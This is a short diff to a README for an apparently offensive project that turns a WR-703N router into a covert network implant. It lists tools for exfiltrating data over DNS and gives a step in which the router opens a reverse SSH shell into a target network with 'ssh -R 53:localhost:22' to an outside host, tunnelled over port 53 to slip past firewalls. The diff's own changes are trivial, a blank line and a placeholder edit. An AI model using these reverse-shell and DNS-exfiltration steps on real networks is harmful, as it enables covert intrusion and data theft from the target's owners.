@@ -11,6 +11,7 @@ Installation/Build Instructions
 Additional Info and Links
 ----
 applications needed on router for dns exfil:
+
 [dig] (https://hackucf.org/blog/hack-all-the-things-exfiltrating-data-via-dns-requests/)
 
 [xxd] (http://jontai.me/blog/2011/11/monitoring-dns-queries-with-tcpdump/)
@@ -48,7 +49,7 @@ applications needed on router for dns exfil:
 
 
 8.) The WR-703N will open a reverse SSH shell into the target network. 
-> ssh -R 53:localhost:22 sourceuser@<public ip>
+> ssh -R 53:localhost:22 sourceuser@public ip
 
 > tunnel through port 53 (because it it is normally unblocked)
 
